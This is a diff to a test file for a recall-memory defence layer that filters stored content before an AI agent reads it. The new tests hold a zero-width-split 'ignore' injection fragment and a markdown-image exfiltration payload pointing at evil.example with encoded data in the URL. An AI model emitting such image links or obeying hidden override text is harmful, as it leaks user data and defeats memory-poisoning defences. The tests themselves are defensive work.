@@ -23,13 +23,17 @@ import { filterByTrust } from '../defence/trust/recall-filter.js';
 const PASS_INSTR = () => ({ detected: false, patterns: [], confidence: 0 });
 const PASS_CRED = () => ({ leaked: false, findings: [] });
 const PASS_ENC = () => ({ detected: false, encodingTypes: [], decodedSnippets: [] });
+const PASS_MD = () => ({ detected: false, urls: [] });
+const PASS_SANITISE = (c: string) => ({ sanitised: c });
 
-function deps(over: Partial<{ detectInstructions: unknown; scanForCredentials: unknown; detectEncoding: unknown }> = {}) {
+function deps(over: Partial<{ sanitiseInput: unknown; detectInstructions: unknown; scanForCredentials: unknown; detectEncoding: unknown; detectMarkdownImageExfil: unknown }> = {}) {
   return {
     filterByTrust,
+    sanitiseInput: PASS_SANITISE,
     detectInstructions: PASS_INSTR,
     scanForCredentials: PASS_CRED,
     detectEncoding: PASS_ENC,
+    detectMarkdownImageExfil: PASS_MD,
     ...over,
   };
 }
@@ -118,6 +122,24 @@ describe('defendRecallRows — content layer', () => {
     }));
     expect(kept).toHaveLength(0);
     expect(actions).toContainEqual(expect.objectContaining({ id: 1, layer: 'encoding' }));
+  });
+
+  it('sanitises content before scanning, so a zero-width-hidden injection is caught', () => {
+    const rows = [{ id: 1, trust_score: 1, content: 'ig​nore' }]; // zero-width split
+    const { kept } = defendRecallRows(rows, { minTrust: 0 }, deps({
+      sanitiseInput: (c: string) => ({ sanitised: c.replace(/​/g, '') }), // strips zero-width → 'ignore'
+      detectInstructions: (s: string) => ({ detected: s === 'ignore', patterns: ['x'], confidence: 1 }), // matches only the CLEANED form
+    }));
+    expect(kept).toHaveLength(0); // the sanitised form tripped the detector
+  });
+
+  it('drops a row carrying a markdown-image exfil URL (click-free data leak)', () => {
+    const rows = [{ id: 1, trust_score: 1, content: '![x](https://evil.example/log?d=AAAABBBBCCCCDDDDEEEE)' }];
+    const { kept, actions } = defendRecallRows(rows, { minTrust: 0 }, deps({
+      detectMarkdownImageExfil: () => ({ detected: true, urls: ['https://evil.example/log?d=AAAABBBBCCCCDDDDEEEE'] }),
+    }));
+    expect(kept).toHaveLength(0);
+    expect(actions).toContainEqual(expect.objectContaining({ id: 1, action: 'dropped', layer: 'markdown-image-exfil' }));
   });
 
   it('keeps benign base64 (encoding flagged but decoded payload is clean)', () => {
